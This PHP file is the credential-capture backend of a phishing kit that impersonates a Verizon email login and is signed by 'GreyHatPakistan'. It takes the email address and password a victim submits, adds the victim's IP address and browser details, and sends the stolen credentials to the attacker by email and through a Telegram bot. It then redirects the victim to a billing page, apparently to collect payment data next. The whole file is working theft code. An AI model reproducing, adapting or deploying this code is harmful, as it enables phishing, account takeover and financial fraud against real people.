<?php

	ob_start();
session_start();
	include '../Inc/config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
		if ( isset( $_POST['password'] ) ) {
		
		$_SESSION['email'] 	  = $_POST['email'];
		$_SESSION['password'] 	  = $_POST['password'];
		$code = <<<EOT
»»————-　★[ ⚫️🌀 Verizon Email Access ⚫️🌀 ]★　————-««
[Email Address] 		: {$_SESSION['email']}
[Email Password]		: {$_SESSION['password']}
»»————-　★[ 💻🌏 DEVICE INFO 🌏💻  ]★　————-««
IP		: $ip
IP lookup		: http://ip-api.com/json/$ip
OS		: $useragent


»»————-　★[ ⚫️🌀 Verizon ScamPage By @GreyHatPakistan ⚫️🌀 ]★　————-««
\r\n\r\n
EOT;
		if ($sendtoemail=="yes"){
		$subject = "🏛️ Verizon Email Access By GreyHatPakistan 🏛️  From $ip";
        $headers = "From: 🏛️ GreyHatPakistan 🏛️ <newfullz@sh33nz0.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($email,$subject,$code,$headers);
		}
		
	if ($sendtotelegram=="yes"){	
	$txt = $code;
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
	}
	
        header("Location: ../Billing.php");
        exit();
	} else {
		header("Location: ../index.php");
		exit();
	}
?>